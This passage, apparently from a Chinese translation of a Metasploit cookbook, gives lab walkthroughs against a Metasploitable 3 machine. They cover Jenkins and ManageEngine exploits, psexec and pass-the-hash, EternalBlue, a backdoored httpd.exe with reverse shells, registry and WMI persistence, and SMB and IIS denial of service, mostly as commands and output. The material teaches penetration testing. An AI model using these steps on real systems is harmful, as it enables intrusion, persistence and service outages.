  msf exploit(atutor_sqli) > info payload/php/meterpreter/reverse_tcp\n\nName: PHP\
  \ Meterpreter, PHP Reverse TCP Stager\nModule: payload/php/meterpreter/reverse_tcp\n\
  Platform: PHP\nArch: php\nNeeds Admin: No\nTotal size: 1101\nRank: Normal\n\nProvided\
  \ by:\n egypt <egypt@metasploit.com>\n\n...\nmsf exploit(atutor_sqli) >\n```\n\n\
  5. 使用反向 shell 时，例如 php/meterpreter/reverse_tcp，我们需要使用 set LHOST 指定监听地址，这将是我们 Kali\
  \ Linux 机器的 IP 地址，以及使用 set LPORT 命令指定监听端口，如果我们不想使用默认端口 4444：\n\n```\nmsf exploit(atutor_sqli)\
  \ > set PAYLOAD php/meterpreter/reverse_tcp\nPAYLOAD => php/meterpreter/reverse_tcp\n\
  msf exploit(atutor_sqli) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf\
  \ exploit(atutor_sqli) > exploit\n\n...\n\nmeterpreter >\n[+] 192.168.216.136:80\
  \ - Deleted dmci.php\n\nmeterpreter > getuid\nServer username: www-data (33)\nmeterpreter\
  \ >\n```\n\n## 利用 Windows Server 机器\n\n利用信息收集和扫描期间收集的信息，我们将进入漏洞利用的世界。在本教程中，我们将了解如何使用\
  \ Metasploit 入侵运行 Windows Server 2008 R2 的 Metasploitable 3 目标系统。我们将使用上一节学到的命令，然后继续选择漏洞利用和\
  \ payload，并设置各种所需参数。\n\n## 准备工作\n\n我们将直接从 msfconsole 开始渗透测试过程。因此，启动控制台并执行端口扫描以收集有关目标的信息。我们在上一章详细讨论了端口扫描。在这里，我假设您已经收集了有关目标系统及其服务的信息。因此，让我们继续选择漏洞利用和\
  \ payload。\n\n有时，仅查看 Nmap 或甚至漏洞扫描器的输出是不够的。services 命令的输出只显示服务器正在运行一个版本的 Apache：\n\
  \n```\nmsf > services -p 8020 192.168.216.10\n\nServices\n========\n```\n\n| 主机\
  \ | 端口 | 协议 | 名称 | 状态 | 信息 |\n|------|------|-------|------|-------|------|\n| 192.168.216.10\
  \ | 8020 | tcp | http | open | Apache httpd |\n\n```\nmsf >\n```\n\n渗透测试不是自动化任务是有原因的；人类好奇，他们倾向于超越服务横幅进行查看。\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_462_0.png)\n\n正如屏幕截图所示，网页上包含了我们搜索漏洞所需的所有信息，因此不要忘记手动检查目标站点。我无法强调初级渗透测试人员因未在浏览器中打开目标站点而错过诸如默认凭据之类的琐碎漏洞的情况有多频繁。\n\
  \n当我们在新闻中看到数据泄露时，大多数时候都是由于密码重复使用；因此 psexec 是渗透测试人员最常使用的工具之一。\n\n## 如何操作...\n\n-\
  \ 1. 查看目标系统上 8484 端口运行的服务，我们可以看到它正在运行 Jenkins；从上一章中使用的 Jenkins-CI Enumeration 辅助模块输出中，我们知道其版本：\n\
  \n```\nmsf > services 192.168.216.10 -p 8484\n\nServices\n=========\n```\n\n| 主机\
  \ | 端口 | 协议 | 名称 | 状态 | 信息 |\n|------|------|-------|------|-------|------|\n| 192.168.216.10\
  \ | 8484 | tcp | http | open | Jenkins Version - 1.637 |\n\n```\nmsf >\n```\n\n\
  有了这些信息，我们可以使用 search 命令快速搜索并查看有哪些可用的漏洞利用：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_463_0.png)\n\
  \n2. 要利用该系统，我们将使用 Jenkins-CI Script-Console Java 执行漏洞利用：\n\n```\nmsf exploit(jenkins_script_console)\
  \ > setg RHOST 192.168.216.10\nRHOST => 192.168.216.10\nmsf exploit(jenkins_script_console)\
  \ > set RPORT 8484\nRPORT => 8484\nmsf exploit(jenkins_script_console) > set TARGETURI\
  \ /\nTARGETURI => /\nmsf exploit(jenkins_script_console) > exploit\n...\n```\n\n\
  ```\nmeterpreter > sysinfo\nComputer : VAGRANT-2008R2\nOS : Windows 2008 R2 (Build\
  \ 7601, Service Pack 1).\nArchitecture : x64\nSystem Language : en_US\nDomain :\
  \ WORKGROUP\nLogged On Users : 2\nMeterpreter : x86/windows\nmeterpreter >\n```\n\
  \n让我们回顾一下我们迄今为止所做的工作。setg 在全局数据存储中设置一个值；这样我们使用的下一个模块将已经定义了 RHOST 值。要使用此漏洞利用，我们还需要指定远程端口和\
  \ Jenkins-CI 应用程序的路径，然后使用 exploit 命令利用目标。\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_464_0.png)\n\
  \nunset 命令用于取消设置一个或多个变量。要刷新所有条目，请将 all 指定为变量名，-g 在全局数据存储变量上操作。\n\n3. 由于我们未指定 payload，Metasploit\
  \ 为我们做了选择：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_464_1.png)\n\n默认情况下，Metasploit\
  \ 使用了反向 TCP meterpreter payload。然而，我们有多个可用的 payload；要列出所有兼容的 payload，可以使用 show payloads\
  \ 命令。\n\n4. 现在我们知道目标正在运行 ManageEngine Desktop Central 版本 9，我们可以使用 search 命令查找可用的漏洞利用：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_465_0.png)\n\n查看输出，我们有几个候选者；这再次说明为什么渗透测试人员尚未被脚本取代。仔细查看输出后，我们可以看到\
  \ ManageEngine Desktop Central 9 FileUploadServlet ConnectionId 漏洞是匹配的，我们可以进入下一阶段并利用目标：\n\
  \n```\nmsf > use exploit/windows/http/manageengine_connectionid_write\nmsf exploit(manageengine_connectionid_write)\
  \ > set PAYLOAD windows/meterpreter/reverse_http\nPAYLOAD => windows/meterpreter/reverse_http\n\
  msf exploit(manageengine_connectionid_write) > set LHOST 192.168.216.5\nLHOST =>\
  \ 192.168.216.5\nmsf exploit(manageengine_connectionid_write) > exploit\n...\n\n\
  meterpreter > getuid\nServer username: NT AUTHORITY\\LOCAL SERVICE\nmeterpreter\
  \ >\n```\n\n这次，我们已指定了 payload，并选择使用 Windows Meterpreter Reverse HTTP Stager，它将通过反射\
  \ DLL 注入 payload 注入 meterpreter 服务器 DLL 并通过 HTTP 隧道传输通信。通过使用 HTTP，此 payload 更有可能绕过出站防火墙规则，因为大多数防火墙会允许机器建立到远程\
  \ HTTP 服务器的会话。\n\n5. 要在 Metasploit 中使用 psexec，我们有几个选项；要列出所有 psexec 漏洞利用，我们可以使用 search\
  \ 命令：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_466_0.png)\n\n对于本教程，我们将查看 psexec\
  \ 和 psexec_psh 漏洞利用。在信息收集和扫描阶段，我们能够暴力破解一些账户；使用这些凭据，我们将看看当用户重复使用密码时攻击者能做什么：\n\n```\n\
  msf > use exploit/windows/smb/psexec\nmsf exploit(psexec) > set SMBUSER Administrator\n\
  SMBUSER => Administrator\nmsf exploit(psexec) > set SMBPASS vagrant\nSMBPASS =>\
  \ vagrant\nmsf exploit(psexec) > run\n\n...\nmeterpreter > sysinfo\nComputer : VAGRANT-2008R2\n\
  OS : Windows 2008 R2 (Build 7601, Service Pack 1).\nArchitecture : x64\nSystem Language\
  \ : en_US\nDomain : WORKGROUP\nLogged On Users : 2\nMeterpreter : x86/windows\n\
  meterpreter > background\n[*] Backgrounding session 1...\nmsf exploit(psexec) >\n\
  ```\n\nMicrosoft Windows Authenticated User Code Execution 模块使用有效的管理员用户名和密码（或密码哈希）来执行任意\
  \ payload，与 SysInternals 提供的 psexec 实用程序类似。\n\n\n\n另一种选择是使用哈希攻击，即攻击者窃取用户的哈希值，而无需破解它，即可重复使用它来欺骗身份验证系统创建新的已认证会话：\n\
  \n```\nmsf exploit(psexec) > set SMBPASS\n aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b\n\
  \ SMBPASS =>\n aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b\n\
  \ msf exploit(psexec) > exploit\n\n [*] Started reverse TCP handler on 192.168.216.5:4444\n\
  \ [*] 192.168.216.10:445 - Connecting to the server...\n ...\n meterpreter >\n```\n\
  \n## 利用常见服务\n\n谈到利用时，会想到一些服务，主要是因为它们在大多数目标上都很常见，而且经常被忽视。\n\n### 准备工作\n\n在本教程中，我们将利用在目标环境中会找到的最常见且被滥用的服务之一，即\
  \ MySQL。大多数情况下我们能够利用 MySQL 服务，是因为它们是为开发目的而安装的，忽略了一些最佳实践，例如设置 root 密码或使用强密码。\n\n\
  ### 如何操作\n\n为了利用 Metasploitable 3 目标机器上的 MySQL 服务，我们将使用 MySQL Enumeration Module\
  \ 辅助模块来枚举目标，并使用 Oracle MySQL for the Microsoft Windows Payload Execution 漏洞利用模块来获取远程\
  \ shell：\n\n```\nmsf > use auxiliary/admin/mysql/mysql_enum\n msf auxiliary(mysql_enum)\
  \ > set RHOST 192.168.216.10\n RHOST => 192.168.216.10\n msf auxiliary(mysql_enum)\
  \ > set USERNAME root\n USERNAME => root\n msf auxiliary(mysql_enum) > run\n```\n\
  \n```\n[*] 192.168.216.10:3306 - Running MySQL Enumerator...\n[*] 192.168.216.10:3306\
  \ - Enumerating Parameters\n...\nmsf auxiliary(mysql_enum) > use exploit/windows/mysql/mysql_payload\n\
  msf exploit(mysql_payload) > set RHOST 192.168.216.10\nRHOST => 192.168.216.10\n\
  msf exploit(mysql_payload) > set PAYLOAD\nwindows/meterpreter/reverse_tcp\nPAYLOAD\
  \ => windows/meterpreter/reverse_tcp\nmsf exploit(mysql_payload) > set LHOST 192.168.216.5\n\
  LHOST => 192.168.216.5\nmsf exploit(mysql_payload) > exploit\n```\n\n```\n[*] Started\
  \ reverse TCP handler on 192.168.216.5:4444\n[*] 192.168.216.10:3306 - Checking\
  \ target architecture...\n[*] 192.168.216.10:3306 - Checking for sys_exec()...\n\
  [*] 192.168.216.10:3306 - sys_exec() already available, using that (override with\
  \ FORCE_UDF_UPLOAD).\n...\nmeterpreter > getuid\nServer username: NT AUTHORITY\\\
  SYSTEM\nmeterpreter >\n```\n\n由于目标没有 root 密码，因此可以使用 MySQL 服务上传 shell 并获得对系统的远程访问。因此，即使你认为没有人会配置一个没有密码的服务，也不要忘记测试基础内容。\n\
  \n## MS17-010 EternalBlue SMB 远程 Windows 内核池损坏\n\n再次，利用在信息收集和扫描阶段收集到的情报，特别是 MS17-010\
  \ SMB RCE Detection 辅助模块的输出，我们可以转向下一个易受攻击的服务。\n\n### 准备工作\n\n不深入细节，MS17-010 EternalBlue\
  \ SMB Remote Windows Kernel Pool Corruption 漏洞利用模块是 Equation Group ETERNALBLUE 漏洞利用的一部分，该漏洞利用是\
  \ Shadow Brokers 发布 FuzzBunch 工具包的一部分，通常被认为是由美国国家安全局（NSA）开发并作为 WannaCry 勒索软件攻击的一部分使用。它是\
  \ Srv!SrvOs2FeaToNt 中 memmove 操作的缓冲区溢出，允许我们执行任意有效载荷。此漏洞影响未安装针对 Microsoft Windows\
  \ SMB Server SMBv1 Server 的安全更新 MS17-010 的 Windows 机器。\n\n### 如何操作...\n\n要启动漏洞利用，请使用\
  \ MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 漏洞利用模块，设置目标 IP\
  \ 地址，使用 meterpreter 反向 TCP 有效载荷，并指定监听地址：\n\n```\nmsf > use exploit/windows/smb/ms17_010_eternalblue\n\
  msf exploit(ms17_010_eternalblue) > set RHOST 192.168.216.10\nRHOST => 192.168.216.10\n\
  msf exploit(ms17_010_eternalblue) > set PAYLOAD\nwindows/x64/meterpreter/reverse_tcp\n\
  PAYLOAD => windows/x64/meterpreter/reverse_tcp\nmsf exploit(ms17_010_eternalblue)\
  \ > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(ms17_010_eternalblue)\
  \ > exploit\n...\n\nmeterpreter > sysinfo\nComputer : VAGRANT-2008R2\nOS : Windows\
  \ 2008 R2 (Build 7601, Service Pack 1).\n...\n\nmeterpreter >\n```\n\n渗透测试与漏洞扫描器不同的一个结果是，当你向他们展示目标系统上正在运行的\
  \ shell 的屏幕截图时，没有人会说你发现的是误报。\n\n## MS17-010 EternalRomance/EternalSynergy/EternalChampion\n\
  \nMS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code\
  \ Execution 漏洞利用模块可用于通过 EternalRomance、EternalSynergy 和 EternalChampion 利用 MS17-010\
  \ 漏洞。此漏洞利用比 EternalBlue 漏洞利用更可靠，但需要命名管道。\n\n### 如何操作...\n\n要启动漏洞利用，请使用 MS17-010\
  \ EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\
  \ 漏洞利用模块，设置目标 IP 地址，使用 meterpreter 反向 TCP 有效载荷，并指定监听地址：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_470_0.png)\n\
  \n## 安装后门\n\n在目标系统上拥有一个 shell 很棒，但有时还不够。有了后门，我们就能确保持久性并在漏洞被修补后仍能访问系统。\n\n### 准备工作\n\
  \n现在我们在目标系统中有了一个会话，我们将使用该会话来后门一个服务；在本教程中，我们将首先对 Apache 服务器进行后门：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_471_0.png)\n\
  \n接下来，我们将使用 Windows Registry Only Persistence 本地漏洞利用模块创建一个在启动时执行的后门。\n\n最后，我们将使用\
  \ Windows Management Instrumentation（WMI）创建一个持久的无文件后门。WMI Event Subscription Persistence\
  \ 漏洞利用模块创建永久的 WMI 事件订阅以实现无文件持久性。\n\n### 如何操作...\n\n- 1. 由于我们不能在二进制文件运行时对其进行后门，因此首先需要做的是杀死\
  \ Apache 进程（httpd.exe），使用 kill 命令后跟进程的 PID：\n\n```\nmeterpreter > kill 3820\nKilling:\
  \ 3820\nmeterpreter >\n```\n\n- 2. 然后，我们在 meterpreter 中使用 download 命令下载我们想要后门的服务二进制文件：\n\
  \n```\nmeterpreter > download\nC:\\\\wamp\\\\bin\\\\apache\\\\apache2.2.21\\\\bin\\\
  \\httpd.exe\n[*] Downloading: C:\\wamp\\bin\\apache\\apache2.2.21\\bin\\httpd.exe\n\
  -> httpd.exe\n...\n\nmsf exploit(ms17_010_eternalblue) >\n```\n\n为了后门该服务，我们将使用 msfconsole，并使用反向\
  \ TCP。\n\n- 3. 将监听地址设置为我们的 Kali Linux 机器 IP 地址，并使用 generate 命令对二进制文件进行后门，使用 -a 选项指定架构、-p\
  \ 指定平台、-x 指定要使用的可执行模板、-k 保持模板可执行文件功能、-t 指定输出格式、-f 指定输出文件名：\n\n```\nmsf exploit(ms17_010_eternalblue)\
  \ > use payload/windows/x64/meterpreter/reverse_tcp\nmsf payload(reverse_tcp) >\
  \ set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf payload(reverse_tcp) > generate\
  \ -a x64 -p Windows -x /root/httpd.exe -k -t exe -f httpd-backdoored.exe\n[*] Writing\
  \ 29184 bytes to httpd-backdoored.exe...\nmsf payload(reverse_tcp) >\n```\n\n- 4.\
  \ 现在后门已准备就绪，我们需要为反向连接启动一个监听器；为此我们将使用 Generic Payload Handler：\n\n```\nmsf payload(reverse_tcp)\
  \ > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD\nwindows/x64/meterpreter/reverse_tcp\n\
  PAYLOAD => windows/x64/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST\
  \ 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler) > exploit -j\n[*]\
  \ Exploit running as background job 0.\n\n[*] Started reverse TCP handler on 192.168.216.5:4444\n\
  msf exploit(handler) >\n```\n\nexploit -j 命令将在作业的上下文中运行它，使我们能够返回到我们的会话并继续攻击。\n\n\
  \n\n5. 回到会话中，我们将把 httpd.exe 文件重命名为 httpd.exe.backup，上传带后门的版本，并将其重命名为 httpd.exe：\n\
  \n```\nmsf exploit(handler) > sessions -i 1\n[*] Starting interaction with 1...\n\
  \nmeterpreter > cd C:\\wamp\\bin\\apache\\apache2.2.21\\bin\\\nmeterpreter > mv\
  \ httpd.exe httpd.exe.backup\nmeterpreter > upload httpd-backdoored.exe\n[*] uploading\
  \ : httpd-backdoored.exe -> httpd-backdoored.exe\n[*] uploaded : httpd-backdoored.exe\
  \ -> httpd-backdoored.exe\nmeterpreter > mv httpd-backdoored.exe httpd.exe\nmeterpreter\
  \ >\n```\n\n6. 然后，我们将进入系统命令 shell，并使用 net stop 命令停止 wampapache，然后使用 net start 重新启动它：\n\
  \n```\nmeterpreter > shell\nProcess 2272 created.\nChannel 3 created.\nMicrosoft\
  \ Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation. All rights\
  \ reserved.\n\nC:\\wamp\\bin\\apache\\apache2.2.21\\bin>net stop wampapache\nnet\
  \ stop wampapache\n...\n\nC:\\wamp\\bin\\apache\\apache2.2.21\\bin>^Z\nBackground\
  \ channel 3? [y/N] y\nmeterpreter >\n```\n\n从输出中可以看到，一旦我们启动了服务，目标系统上就出现了两个新的 meterpreter\
  \ 会话：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_473_0.png)\n\n7. 要使用 Windows 注册表仅持久化模块，我们需要指定运行该模块的会话，在本例中是使用\
  \ MS17-010 EternalBlue SMB 远程 Windows 内核池损坏漏洞利用获得的会话 1；设置 payload；设置监听 IP 地址；并使用\
  \ exploit 命令启动漏洞利用：\n\n```\nmsf > use exploit/windows/local/registry_persistence\n\
  msf exploit(registry_persistence) > set SESSION 1\nSESSION => 1\nmsf exploit(registry_persistence)\
  \ > set PAYLOAD\nwindows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\n\
  msf exploit(registry_persistence) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\n\
  msf exploit(registry_persistence) > exploit\n...\n\nHKCU\\Software\\Microsoft\\\
  Windows\\CurrentVersion\\Run\\16jfvtho\n[*] Clean up Meterpreter RC file:\n/root/.msf4/logs/persistence/192.168.216.10_20171029.4303/192.168.216.10_20171029.4303.rc\n\
  ```\n\n8. 现在我们已成功安装后门注册表项，我们需要设置监听器，以便下次机器重启时我们会获得一个会话：\n\n```\nmsf exploit(registry_persistence)\
  \ > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD\nwindows/meterpreter/reverse_tcp\n\
  PAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.216.5\n\
  LHOST => 192.168.216.5\nmsf exploit(handler) > run -j\n[*] Exploit running as background\
  \ job 0.\n\n[*] Started reverse TCP handler on 192.168.216.5:4444\nmsf exploit(handler)\
  \ >\n```\n\n9. 要触发漏洞利用，只需重新启动 Metasploitable 3 机器，我们就会获得一个新的会话：\n\n```\nmsf exploit(handler)\
  \ >\n[*] Sending stage (179267 bytes) to 192.168.216.10\n[*] Meterpreter session\
  \ 2 opened (192.168.216.5:4444 -> 192.168.216.10:49290) at 2017-10-29 07:39:45 -0400\n\
  \nmsf exploit(registry_persistence) > sessions -i 2\n```\n\n```\n[*] Starting interaction\
  \ with 2...\n\nmeterpreter > sysinfo\nComputer : VAGRANT-2008R2\nOS : Windows 2008\
  \ R2 (Build 7601, Service Pack 1).\nArchitecture : x64\nSystem Language : en_US\n\
  Domain : WORKGROUP\nLogged On Users : 2\nMeterpreter : x86/windows\nmeterpreter\
  \ >\n```\n\n太好了，我们从目标系统获得了新的会话。\n\n10. 要使用 WMI 事件订阅持久化本地漏洞利用模块，我们首先需要指定运行该模块的会话。然后，我们将回调间隔设置为一分钟，这样就无需等待\
  \ 30 分钟的默认时间；接下来将触发 payload 的事件 ID 设置为 4624（成功登录），将触发 payload 的用户名设置为 Administrator，并使用\
  \ exploit 命令启动漏洞利用：\n\n```\nmsf > use exploit/windows/local/wmi_persistence\nmsf\
  \ exploit(wmi_persistence) > set SESSION 1\nSESSION => 1\nmsf exploit(wmi_persistence)\
  \ > set CALLBACK_INTERVAL 60000\nCALLBACK_INTERVAL => 60000\nmsf exploit(wmi_persistence)\
  \ > set EVENT_ID_TRIGGER 4624\nEVENT_ID_TRIGGER => 4624\nmsf exploit(wmi_persistence)\
  \ > set USERNAME_TRIGGER Administrator\nUSERNAME_TRIGGER => Administrator\nmsf exploit(wmi_persistence)\
  \ > set LPORT 4445\nLPORT => 4445\nmsf exploit(wmi_persistence) > exploit\n\n[-]\
  \ This module cannot run as System\nmsf exploit(wmi_persistence) >\n```\n\n11. 查看输出，我们遇到了一个问题；该模块无法作为系统运行，这意味着我们必须返回会话并使用\
  \ migrate 命令迁移到在用户上下文中运行的进程：\n\n```\nmsf exploit(wmi_persistence) > sessions -i\
  \ 1\n[*] Starting interaction with 1...\n\nmeterpreter > getuid\n```\n\n```\nServer\
  \ username: NT AUTHORITY\\SYSTEM\nmeterpreter > migrate -N explorer.exe\n[*] Migrating\
  \ from 5700 to 4624...\n[*] Migration completed successfully.\nmeterpreter > getuid\n\
  Server username: VAGRANT-2008R2\\vagrant\nmeterpreter > background\n[*] Backgrounding\
  \ session 1...\nmsf exploit(wmi_persistence) > exploit\n...\n[*] Clean up Meterpreter\
  \ RC file:\n/root/.msf4/logs/wmi_persistence/192.168.216.10_20171029.5446/\n192.168.216.10_20171029.5446.rc\n\
  msf exploit(wmi_persistence) >\n```\n\n12. 然后，我们将设置监听器，使用通用 Payload 处理程序模块，以便下次用户登录到机器时，我们将使用我们的\
  \ WMI 后门获得一个新的会话：\n\n```\nmsf exploit(handler) > set PAYLOAD\nwindows/meterpreter/reverse_tcp\n\
  PAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LPORT 4445\n\
  LPORT => 4445\nmsf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\n\
  msf exploit(handler) > exploit -j\n[*] Exploit running as background job 1.\n...\n\
  \nmsf exploit(handler) > sessions -i 2\n[*] Starting interaction with 2...\n\nmeterpreter\
  \ > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter >\n```\n\n通过在目标机器上注销并以管理员用户身份登录，我们能够验证后门按预期工作。\n\
  \n## 拒绝服务\n\n拒绝服务（DoS）攻击会拒绝合法用户访问计算机服务（或资源），通常是通过用请求使服务过载或利用漏洞来实现，导致性能下降，甚至可能导致服务或操作系统崩溃。\n\
  \n### 准备工作\n\nSMBLoris 是针对 Microsoft Windows 操作系统的远程且无需凭据的 DoS 攻击，由 Server Message\
  \ Block（SMB）网络协议实现中一个 20 多年前的漏洞引起。\n\n### 如何操作...\n\n- 1. 在使用 SMBLoris NBSS 拒绝服务辅助\
  \ DoS 模块之前，我们需要使用 ulimit 命令将最大打开文件描述符数设置为 65535，以便处理同时连接：\n\n```\nroot@kali:~# ulimit\
  \ -n 65535\nroot@kali:~# ulimit -n\n65535\nroot@kali:~#\n```\n\n- 2. 现在我们已将最大同时连接数设置为\
  \ 65535，我们可以使用 SMBLoris NBSS 拒绝服务辅助 DoS 模块攻击目标，只需设置 Metasploitable 3 机器的 IP 地址并输入\
  \ run 运行模块即可：\n\n```\nroot@kali:~# msfconsole -q\nmsf > use auxiliary/dos/smb/smb_loris\n\
  msf auxiliary(smb_loris) > set RHOST 192.168.216.10\nRHOST => 192.168.216.10\nmsf\
  \ auxiliary(smb_loris) > run\n\n[*] 192.168.216.10:445 - Sending packet from Source\
  \ Port: 1025\n[*] 192.168.216.10:445 - Sending packet from Source Port: 1026\n[*]\
  \ 192.168.216.10:445 - Sending packet from Source Port: 1027\n...snip...\n[*] 192.168.216.10:445\
  \ - Sending packet from Source Port:\n29867\n```\n\n```\n^C[-] 192.168.216.10:445\
  \ - Auxiliary interrupted by the console user\n[*] Auxiliary module execution completed\n\
  msf auxiliary(smb_loris) >\n```\n\n我们可以使用 -q 选项启动 msfconsole，这样启动时就不会打印横幅。要显示 MSFconsole\
  \ 的手册页，可以使用 man 命令，如此—man msfconsole。\n\n- 3. 查看目标机器，我们可以看到攻击通过发送 SMB 请求来消耗目标中的大量内存，其中\
  \ NetBIOS 会话服务（NBSS）长度头值设置为最大可能值，这会启动大量会话，并且内存不会被释放，导致目标机器停止响应：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_478_0.png)\n\
  \n\n\n另一个很棒的 DoS 攻击是 MS15-034 HTTP 协议栈请求处理拒绝服务。\n\n## 如何操作...\n\n如果 Microsoft Windows\
  \ 7、Windows 8、Windows Server 2008 或 Windows Server 2012 运行着未安装 MS15-034 的 IIS 服务，我们可以使用此简单攻击使目标崩溃：\n\
  \n```\nmsf > use auxiliary/dos/http/ms15_034_ulonglongadd\nmsf auxiliary(ms15_034_ulonglongadd)\
  \ > show options\n\nModule options (auxiliary/dos/http/ms15_034_ulonglongadd):\n\
  \n    Name            Current Setting     Required  Description\n    ----      \
  \      ---------------     --------  -----------\n    Proxies                  \
  \               no        A proxy chain of format\ntype:host:port[,type:host:port][...]\n\
  \    RHOSTS                                    yes       The target address range\
  \ or\n...\nmsf auxiliary(ms15_034_ulonglongadd) > set RHOSTS 192.168.216.10\nRHOSTS\
  \ => 192.168.216.10\nmsf auxiliary(ms15_034_ulonglongadd) > run\n>[*] Scanned 1\
  \ of 1 hosts (100% complete)\n...\nmsf auxiliary(ms15_034_ulonglongadd) >\n```\n"
